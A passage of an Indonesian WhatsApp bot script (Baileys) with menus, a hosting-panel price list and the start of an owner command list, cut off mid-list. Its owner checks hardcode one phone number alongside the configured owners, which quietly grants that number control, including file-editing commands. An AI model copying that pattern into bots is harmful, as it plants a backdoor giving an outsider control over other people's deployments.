/*
  BASE SIMPEL PAIRING CODE 
  BASE : MILKITA
  DEVELOPER : ALVIN
  RECODE BY : ${ownername} 
  REMAKE BY : RAINMC

  THANK FOR 
  ALVIN 
  SANJAYA
  ${ownername}
  
  (KETAHUAN DELETE CREDIT SIAP² DI KENON)
*/

require('./CONFIG')
const {
downloadContentFromMessage,
BufferJSON,
WA_DEFAULT_EPHEMERAL,
generateWAMessageFromContent,
proto,
generateWAMessageContent,
generateWAMessage,
prepareWAMessageMedia,
areJidsSameUser,
InteractiveMessage,
getContentType
} = global.baileys
const fs = require('fs');
const fg = require('api-dylux')
const util = require('util');
const chalk = require('chalk');
const axios = require('axios');
const os = require('os')
const cheerio = require('cheerio')
const yts = require ('yt-search');
const kotz = require("kotz-api");
const crypto = require('crypto')
const bochil = require('@bochilteam/scraper')
const moment = require('moment-timezone');
const client = require('filestack-js')
const jsobfus = require('javascript-obfuscator');
const Cerpen = require('dhn-api')
const toMS = require("ms");
const fsx = require("fs-extra")
const path = require('path')
const gtts = require('node-gtts')
const gis = require('g-i-s')
const hxz = require('hxz-api')
const jimp = require("jimp")
const ms = require("parse-ms");
const acrcloud = require('acrcloud')
const FormData = require("form-data");
const { fromBuffer } = require('file-type')
const rimraf = require('rimraf')
const fetch = require('node-fetch')
const cron = require('node-cron')
const { exec, spawn, execSync } = require("child_process")
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const translate = require("@vitalets/google-translate-api");
const similarity = require('similarity')
const ytdl = require("ytdl-core")
const { pinterest } = require('./SCRAPE/scraper')
const { smsg, fetchJson, getBuffer, getGroupAdmins, TelegraPh, msToDate, isUrl, hitungmundur, checkBandwidth, runtime } = require('./LIB/simple')
const { generateProfilePicture, removeEmojis, tanggal, formatp, formatDate, getTime, sleep, clockString, jsonformat, parseMention, getRandom, delay } = require('./LIB/myfunc')
const { isSetClose, addSetClose, removeSetClose, changeSetClose, getTextSetClose, isSetLeft, addSetLeft, removeSetLeft, changeSetLeft, getTextSetLeft, isSetOpen, addSetOpen, removeSetOpen, changeSetOpen, getTextSetOpen, isSetWelcome, addSetWelcome, removeSetWelcome, changeSetWelcome, getTextSetWelcome } = require("./LIB/store")
const owner = JSON.parse(fs.readFileSync('./DATABASE/owner.json'))
const uploadImage = require('./LIB/uploadImage')
const { domain, apikey, capikey, eggsnya, location } = require("./SEARCH/NL-Cpanel/cpanel");
let premium = JSON.parse(fs.readFileSync('./DATABASE/premium.json'));

////==================================

module.exports = nolan = async (nolan, m, chatUpdate, store) => {
const { isBaileys, content } = m
try {
const {
type,
quotedMsg,
mentioned,
now,
fromMe
} = m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const Prem = require("./LIB/premium");
const res = JSON.parse(fs.readFileSync('./DATABASE/reseller.json').toString())

//=========================================================================

const isCmd = /^[°•π÷×¶∆£¢€¥®™�✓_=|~!?#/$%^&.+-,\\\©^]/.test(body)
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await nolan.decodeJid(nolan.user.id)
const bulan = moment.tz('Asia/Jakarta').format('MM/MMMM')
const tahun = moment.tz('Asia/Jakarta').format('YYYY')
const tanggal = moment().tz("Asia/Jakarta").format("dddd, d")
const jam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const jamm = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm')
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const wibTime = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const penghitung = moment().tz("Asia/Jakarta").format("dddd, D MMMM - YYYY")

//=========================================================================

const isCreator = ["6285263390832@s.whatsapp.net", botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isOwner = ["6285263390832@s.whatsapp.net", botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isReseller = [botNumber, ...res].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = m.chat
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const isMediaa = /image|video/.test(mime)
const isPc = from.endsWith('@s.whatsapp.net')
const isGc = from.endsWith('@g.us')
const usedPrefix = prefix + command;
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 

//=========================================================================

const groupMetadata = m.isGroup ? await nolan.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmin = m.isGroup ? await getGroupAdmins(participants) : ''
const isAdmin = m.isGroup ? groupAdmin.includes(m.sender) : false
const isBotAdmin = m.isGroup ? groupAdmin.includes(botNumber) : false
const isPremium = isOwner ? true : Prem.checkPremiumUser(m.sender, premium)
const mesej = text.split('|')

//=========================================================================

//Ucapan Waktu #2
if(wibTime < "23:59:00"){ var ucapanWaktu = '*Selamat* Malam'}
if(wibTime < "19:00:00"){ var ucapanWaktu = '*Selamat* Malam'}
if(wibTime < "18:00:00"){ var ucapanWaktu = '*Selamat* Sore'}
if(wibTime < "15:00:00"){ var ucapanWaktu = '*Selamat* Siang'}
if(wibTime < "11:00:00"){ var ucapanWaktu = '*Selamat* Pagi'}
if(wibTime < "06:00:00"){ var ucapanWaktu = '*Selamat* Pagi'}    

//=========================================================================

const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `628526330832-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': global.thumb, thumbnail: global.thumb,sendEphemeral: true}}}
const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {extendedTextMessage: {text: `${prefix+command} ${mesej}`,thumbnailUrl: global.thumb}}}

//=========================================================================

try {
var ppuser = await nolan.profilePictureUrl(m.sender, 'image')} catch (err) {
let ppuser = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'}
let ppnyauser = await getBuffer(ppuser)

const onlypc = () => {
nolan.sendMessage(m.chat, {text: `${global.wm} Script Private, Gunakan Diprivate Chat`}, {quoted: m})
}

const getfunc = (funcc) => {
return "const "+`'${funcc}'`+fs.readFileSync('./NOLAN.js').toString().split('const \''+funcc+'\'')[1].split('')
}

async function dellCase(filePath, caseNameToRemove) {
fs.readFile(filePath, 'utf8', (err, data) => {
if (err) {
m.reply('Terjadi Kesalahan:', err);
return;
}
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
if (err) {
m.reply('Terjadi Kesalahan Saat Membaca Case')
return;
}
});
});
}

async function nolanR(teks) {
     nolan.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
fileName: 'ɴᴏʟᴀɴ ᴘʀᴏᴊᴇᴄᴛ',
mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
fileLength: 99999999999999999,
pageCount: 50, caption: teks,
 contextInfo: {
   externalAdReply: {  
   showAdAttribution: true,
   title: `${ownername}`,
   body: ``,
   previewType: "VIDEO",
   thumbnailUrl: global.nolan,
   sourceUrl: global.syt,
}
}}, {quoted : m}
)}

async function nolanR2(teks) {
     nolan.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
fileName: 'ɴᴏʟᴀɴ ᴘʀᴏᴊᴇᴄᴛ',
mimetype: "application/pdf",
fileLength: 99999999999999999,
pageCount: 50, caption: teks,
 contextInfo: {
   externalAdReply: {  
   showAdAttribution: true,
   title: `${ownername}`,
   body: ``,
   previewType: "VIDEO",
   thumbnailUrl: global.thumb,
   sourceUrl: global.sgc,
}
}}, {quoted : m}
)}

async function nolanR3(teks) {
     nolan.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
fileName: 'ɴᴏʟᴀɴ ᴘʀᴏᴊᴇᴄᴛ',
mimetype: "application/pdf",
fileLength: 99999999999999999,
pageCount: 50, caption: teks,
 contextInfo: {
   externalAdReply: {  
   showAdAttribution: true,
   title: `${ownername}`,
   body: ``,
   previewType: "VIDEO",
   thumbnailUrl: global.nolan,
   sourceUrl: global.stg,
}
}}, {quoted : m}
)}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await nolan.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp3' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await nolan.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

// AUTO TYPING
if (global.autotyping) {
nolan.sendPresenceUpdate('composing', from)
}

if (global.autoread) {
if (isCmd) { nolan.readMessages([m.key])}
}

if (global.privateOnly) {
if (isCmd && !isPc) {
return onlypc()
}
}

switch (command) {
//=========================================================================

case 'help':
case 'list':
case 'menu': {
nolan.sendMessage(from, {react: {text: "🔎", key: m.key}})
let menunya = `
Hai kak ${pushname} ${ucapanWaktu}\nWelcome to *${botname}*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃┃ *INFO BOT*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ *Bot Name :* ${botname}
┃ *Own name :* ${ownername}
┃ *No Own :* ${owner}
┃ *Server :* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┃ *Jam :* ${wibTime}
┃ *Tanggal :* ${penghitung}
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃┃ *USER INFO*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ *Name :* ${pushname}
┃ *Number :* ${m.sender.split("@")[0]}
┃ *Profile :* ${isReseller ? 'Reseller' : isOwner ? 'Lebih Dari Reseller' : 'Bukan Reseller'}
┃ *Status :* ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'User'}
┃ *Saldo :* ${isOwner ? 'Tidak Terbatas' : isPremium ? 'Tidak Terbatas' : 'Nol'}
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: menunya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `BY ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image : fs.readFileSync(`./SEARCH/Thumbnail.jpg`)}, { upload: nolan.waUploadToServer})), 
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"LIST MENU\",\"sections\":[{\"title\":\"List Menu Bot ${global.botname}\",\"highlight_label\":\"\",\"rows\":[
{"header":"","title":"ALL MENU","description":"SEMUA FITUR BOT","id":"${prefix}list-menu-lainnya"},
{"header":"","title":"OWNER MENU","description":"LIST MENU OWNER ${ownername}","id":"${prefix}list-menu-owner"},
{"header":"","title":"MAIN MENU","description":"LIST MAIN MENU ${ownername}","id":"${prefix}list-main-menu"},
{"header":"","title":"PANEL MENU","description":"LIST PANEL BY ${ownername}","id":"${prefix}listpanelku"},
{"header":"","title":"DOWNLOAD MENU","description":"LIST MENU DOWNLOAD","id":"${prefix}list-menu-download"}]}]}`,
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"MY OWNER","url":"https://wa.me/${global.owner}?text=Halo+Bang+${global.ownername}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"YOUTUBE OWNER","url":"${yt}","merchant_url":"https://www.google.com"}`
 }, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"TELEGRAM OWNER","url":"${telegram}?text=Halo+Bang+${ownername}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"GROUP OWNER","url":"${global.sgc}","merchant_url":"https://www.google.com"}`
}],}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `® ${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})
await nolan.sendMessage(from, {audio: fs.readFileSync(`./SEARCH/Sound.mp3`), mimetype: 'audio/mp4' }, { quoted: m })
}
break

case 'medsos': 
case 'sosmed': {
nolan.sendMessage(from, {react: {text: "🔎", key: m.key}})
let menunya = `
Hai ${pushname} 👋
${ucapanWaktu}

*Di bawah ini adalah media sosia*
${ownername}`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: menunya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `BY ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image : fs.readFileSync(`./SEARCH/Thumbnail.jpg`)}, { upload: nolan.waUploadToServer})), 
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"YOUTUBE OWNER","url":"${yt}","merchant_url":"https://www.google.com"}`
},{
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"INSTAGRAM OWNER","url":"${ig}","merchant_url":"https://www.google.com"}`
},{
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"TIK-TOK OWNER","url":"${tt}","merchant_url":"https://www.google.com"}`
},{
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"TELEGRAM OWNER","url":"${telegram}","merchant_url":"https://www.google.com"}`
},{
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"NUMBER OWNER","url":"https://wa.me/+${global.owner}","merchant_url":"https://www.google.com"}`
},{
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"YOUTUBE OWNER","url":"${yt}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"GROUP OWNER","url":"${gcku}","merchant_url":"https://www.google.com"}`
},{
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"CHANEL OWNER","url":"${saluran}","merchant_url":"https://www.google.com"}`
},
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `® ${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})
await nolan.sendMessage(from, {audio: fs.readFileSync(`./SEARCH/Sound.mp3`), mimetype: 'audio/mp4' }, { quoted: m })
}
break

case 'listpanelku': {
nolan.sendMessage(from, {react: {text: "🔎", key: m.key}})
let menunya = `
Hai ${pushname} 👋
${ucapanWaktu}
Berikut adalah list harga panel by ${ownername}
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: menunya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `BY ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image : fs.readFileSync(`./SEARCH/Thumbnail.jpg`)}, { upload: nolan.waUploadToServer})), 
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"LIST PANEL PANEL BY ${ownername}\",\"sections\":[{\"title\":\"LIST PANEL 1 - 25 GB\",\"highlight_label\":\"\",\"rows\":[
{"header":"","title":"RAM 1 GB CPU 30%","description":"PANEL PETRODACTYL RAM 1 GB CPU 30% Rp. 500","id":"${prefix}1gb ${text}"},
{"header":"","title":"RAM 2 GB CPU 60%","description":"PANEL PETRIDACTYL RAM 2 GB CPU 60% Rp. 1.000","id":".cpanelbg"},
{"header":"","title":"RAM 3 GB CPU 90%","description":"PANEL PETRIDACTYL RAM 3 GB CPU 90% Rp. 1.500","id":".cpanelbg"},
{"header":"","title":"RAM 4 GB CPU 120%","description":"PANEL PETRIDACTYL RAM 4 GB CPU 120% Rp. 2.000","id":".cpanelbg"},
{"header":"","title":"RAM 5 GB CPU 150%","description":"PANEL PETRIDACTYL RAM 5 GB CPU 150% Rp. 2.500","id":".cpanelbg"},
{"header":"","title":"RAM 6 GB CPU 180%","description":"PANEL PETRIDACTYL RAM 6 GB CPU 180% Rp. 3.000","id":".cpanelbg"},
{"header":"","title":"RAM 7 GB CPU 210%","description":"PANEL PETRIDACTYL RAM 7 GB CPU 210% Rp. 3.500","id":".cpanelbg"},
{"header":"","title":"RAM 8 GB CPU 240%","description":"PANEL PETRIDACTYL RAM 8 GB CPU 240% Rp. 4.000","id":".cpanelbg"},
{"header":"","title":"RAM 9 GB CPU 270%","description":"PANEL PETRIDACTYL RAM 9 GB CPU 270% Rp. 4.500","id":".cpanelbg"},
{"header":"","title":"RAM 10 GB CPU 300%","description":"PANEL PETRIDACTYL RAM 10 GB CPU 300% Rp. 5.000","id":".cpanelbg"},
{"header":"","title":"RAM 11 GB CPU 330%","description":"PANEL PETRIDACTYL RAM 11 GB CPU 330% Rp. 5.500","id":".cpanelbg"},
{"header":"","title":"RAM 12 GB CPU 360%","description":"PANEL PETRIDACTYL RAM 12 GB CPU 360% Rp. 6.000","id":".cpanelbg"},
{"header":"","title":"RAM 13 GB CPU 390%","description":"PANEL PETRIDACTYL RAM 13 GB CPU 390% Rp. 6.500","id":".cpanelbg"},
{"header":"","title":"RAM 14 GB CPU 420%","description":"PANEL PETRIDACTYL RAM 14 GB CPU 420% Rp. 7.000","id":".cpanelbg"},
{"header":"","title":"RAM 15 GB CPU 450%","description":"PANEL PETRIDACTYL RAM 15 GB CPU 450% Rp. 7.500","id":".cpanelbg"},
{"header":"","title":"RAM 16 GB CPU 480%","description":"PANEL PETRIDACTYL RAM 16 GB CPU 480% Rp. 8.000","id":".cpanelbg"},
{"header":"","title":"RAM 17 GB CPU 510%","description":"PANEL PETRIDACTYL RAM 17 GB CPU 510% Rp. 8.500","id":".cpanelbg"},
{"header":"","title":"RAM 18 GB CPU 540%","description":"PANEL PETRIDACTYL RAM 18 GB CPU 540% Rp. 9.000","id":".cpanelbg"},
{"header":"","title":"RAM 19 GB CPU 570%","description":"PANEL PETRIDACTYL RAM 19 GB CPU 570% Rp. 9.500","id":".cpanelbg"},
{"header":"","title":"RAM 20 GB CPU 600%","description":"PANEL PETRIDACTYL RAM 20 GB CPU 600% Rp. 10.000","id":".cpanelbg"},
{"header":"","title":"RAM 21 GB CPU 630%","description":"PANEL PETRIDACTYL RAM 21 GB CPU 630% Rp. 10.500","id":".cpanelbg"},
{"header":"","title":"RAM 22 GB CPU 660%","description":"PANEL PETRIDACTYL RAM 22 GB CPU 660% Rp. 11.000","id":".cpanelbg"},
{"header":"","title":"RAM 23 GB CPU 690%","description":"PANEL PETRIDACTYL RAM 23 GB CPU 690% Rp. 11.500","id":".cpanelbg"},
{"header":"","title":"RAM 24 GB CPU 720%","description":"PANEL PETRIDACTYL RAM 24 GB CPU 720% Rp. 12.000","id":".cpanelbg"},
{"header":"","title":"RAM 25 GB CPU 750%","description":"PANEL PETRIDACTYL RAM 25 GB CPU 750% Rp. 12.500","id":".cpanelbg"}]
}]}`
}, {"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"LIST PANEL PANEL BY ${ownername} 2\",\"sections\":[{\"title\":\"LIST PANEL 26 - 50 GB\",\"highlight_label\":\"\",\"rows\":[
{"header":"","title":"RAM 26 GB CPU 780%","description":"PANEL PETRODACTYL RAM 26 GB CPU 780% Rp. 13.000","id":".cpanelbg"},
{"header":"","title":"RAM 27 GB CPU 810%","description":"PANEL PETRODACTYL RAM 27 GB CPU 810% Rp. 13.500","id":".cpanelbg"},
{"header":"","title":"RAM 28 GB CPU 840%","description":"PANEL PETRODACTYL RAM 28 GB CPU 840% Rp. 14.000","id":".cpanelbg"},
{"header":"","title":"RAM 29 GB CPU 870%","description":"PANEL PETRODACTYL RAM 29 GB CPU 870% Rp. 14.500","id":".cpanelbg"},
{"header":"","title":"RAM 30 GB CPU 900%","description":"PANEL PETRODACTYL RAM 30 GB CPU 900% Rp. 15.000","id":".cpanelbg"},
{"header":"","title":"RAM 31 GB CPU 930%","description":"PANEL PETRODACTYL RAM 31 GB CPU 930% Rp. 15.500","id":".cpanelbg"},
{"header":"","title":"RAM 32 GB CPU 960%","description":"PANEL PETRODACTYL RAM 32 GB CPU 960% Rp. 16.000","id":".cpanelbg"},
{"header":"","title":"RAM 33 GB CPU 990%","description":"PANEL PETRODACTYL RAM 33 GB CPU 990% Rp. 16.500","id":".cpanelbg"},
{"header":"","title":"RAM 34 GB CPU 1020%","description":"PANEL PETRODACTYL RAM 34 GB CPU 1020% Rp. 17.000","id":".cpanelbg"},
{"header":"","title":"RAM 35 GB CPU 1050%","description":"PANEL PETRODACTYL RAM 35 GB CPU 1050% Rp. 17.500","id":".cpanelbg"},
{"header":"","title":"RAM 36 GB CPU 1080%","description":"PANEL PETRODACTYL RAM 36 GB CPU 1080% Rp. 18.000","id":".cpanelbg"},
{"header":"","title":"RAM 37 GB CPU 1110%","description":"PANEL PETRODACTYL RAM 37 GB CPU 1110% Rp. 18.500","id":".cpanelbg"},
{"header":"","title":"RAM 38 GB CPU 1140%","description":"PANEL PETRODACTYL RAM 38 GB CPU 1140% Rp. 19.000","id":".cpanelbg"},
{"header":"","title":"RAM 39 GB CPU 1170%","description":"PANEL PETRODACTYL RAM 39 GB CPU 1170% Rp. 19.500","id":".cpanelbg"},
{"header":"","title":"RAM 40 GB CPU 1200%","description":"PANEL PETRODACTYL RAM 40 GB CPU 1200% Rp. 20.000","id":".cpanelbg"},
{"header":"","title":"RAM 41 GB CPU 1230%","description":"PANEL PETRODACTYL RAM 41 GB CPU 1230% Rp. 20.500","id":".cpanelbg"},
{"header":"","title":"RAM 42 GB CPU 1260%","description":"PANEL PETRODACTYL RAM 42 GB CPU 1260% Rp. 21.000","id":".cpanelbg"},
{"header":"","title":"RAM 43 GB CPU 1290%","description":"PANEL PETRODACTYL RAM 43 GB CPU 1290% Rp. 21.500","id":".cpanelbg"},
{"header":"","title":"RAM 44 GB CPU 1320%","description":"PANEL PETRODACTYL RAM 44 GB CPU 1320% Rp. 22.000","id":".cpanelbg"},
{"header":"","title":"RAM 45 GB CPU 1350%","description":"PANEL PETRODACTYL RAM 45 GB CPU 1350% Rp. 22.500","id":".cpanelbg"},
{"header":"","title":"RAM 46 GB CPU 1380%","description":"PANEL PETRODACTYL RAM 46 GB CPU 1380% Rp. 23.000","id":".cpanelbg"},
{"header":"","title":"RAM 47 GB CPU 1410%","description":"PANEL PETRODACTYL RAM 47 GB CPU 1410% Rp. 23.500","id":".cpanelbg"},
{"header":"","title":"RAM 48 GB CPU 1440%","description":"PANEL PETRODACTYL RAM 48 GB CPU 1440% Rp. 24.000","id":".cpanelbg"},
{"header":"","title":"RAM 49 GB CPU 1470%","description":"PANEL PETRODACTYL RAM 49 GB CPU 1470% Rp. 24.500","id":".cpanelbg"},
{"header":"","title":"RAM 50 GB CPU 1500%","description":"PANEL PETRODACTYL RAM 50 GB CPU 1500% Rp. 25.000","id":".cpanelbg"},
{"header":"","title":"ALL MENU","description":"SEMUA FITUR BOT","id":"${prefix}list-menu-lainnya"},
{"header":"","title":"OWNER MENU","description":"LIST MENU OWNER ${ownername}","id":"${prefix}list-menu-owner"},
{"header":"","title":"MAIN MENU","description":"LIST MAIN MENU ${ownername}","id":"${prefix}list-main-menu"},
{"header":"","title":"PANEL MENU","description":"LIST PANEL BY ${ownername}","id":"${prefix}listpanelku"},
{"header":"","title":"DOWNLOAD MENU","description":"LIST MENU DOWNLOAD","id":"${prefix}list-menu-download"}]}]}`,
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"MY OWNER","url":"https://wa.me/+${global.owner}?text=Halo+Bang+${global.ownername}+mau+beli+panel","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"TELEGRAM OWN","url":"${telegram}?text=Halo+Bang+${ownername}+mau+beli+panel","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"GROUP OWN","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `PANEL BY ${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})
}
break

case 'list-menu-lainnya': {
let listnya = `${ucapanWaktu}\n${pushname} 👋
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃┃ *𝗠𝗔𝗜𝗡  𝗠𝗘𝗡𝗨*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ ${prefix}ᴘɪɴ
┃ ${prefix}ᴍᴇɴᴜ
┃ ${prefix}ᴏᴡɴᴇʀ
┃ ${prefix}ᴘʀᴇғɪx
┃ ${prefix}ʀᴜʟᴇs
┃ ${prefix}ᴛᴇʟᴇɢʀᴀᴍ
┃ ${prefix}ʏᴏᴛᴜʙᴇ
┃ ${prefix}sᴀʟᴜʀᴀɴ
┃ ${prefix}ɢʀᴏᴜᴘʙᴏᴛ
┃ ${prefix}ʜᴇʟᴘ
┃ ${prefix}ᴄʀᴇᴅɪᴛ
┃ ${prefix}sᴄʀɪᴘᴛ
┃ ${prefix}ᴘᴀʏᴍᴇɴᴛ
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃┃ *𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ ${prefix}ʟɪsᴛsᴇʀᴠᴇʀ
┃ ${prefix}ᴅᴇʟsᴇʀᴠᴇʀ
┃ ${prefix}ʟɪsᴛᴜsᴇʀ
┃ ${prefix}ᴅᴇʟᴜsᴇʀ
┃ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ
┃ ${prefix}ʟɪsᴛʀᴇsᴇʟʟᴇʀ
┃ ${prefix}ᴀᴅᴅʀᴇsᴇʟʟᴇʀ
┃ ${prefix}ᴅᴇʟʀᴇsᴇʟʟᴇʀ
┃ ${prefix}ʟɪsᴛᴏᴡɴᴇʀ
┃ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
┃ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ
┃ ${prefix}ʟɪsᴛᴘʀᴇᴍ
┃ ${prefix}ᴀᴅᴅᴘʀᴇᴍ
┃ ${prefix}ᴅᴇʟᴘʀᴇᴍ
┃ ${prefix}ɢᴇᴛғɪʟᴇs
┃ ${prefix}ɢᴇᴛғᴜɴᴄ
┃ ${prefix}ᴀᴅᴅᴄᴀsᴇ
┃ ${prefix}ɢᴇᴛᴄᴀsᴇ
┃ ${prefix}ᴅᴇʟᴄᴀsᴇ
┃ ${prefix}ɢᴀɴᴛɪғɪʟᴇ
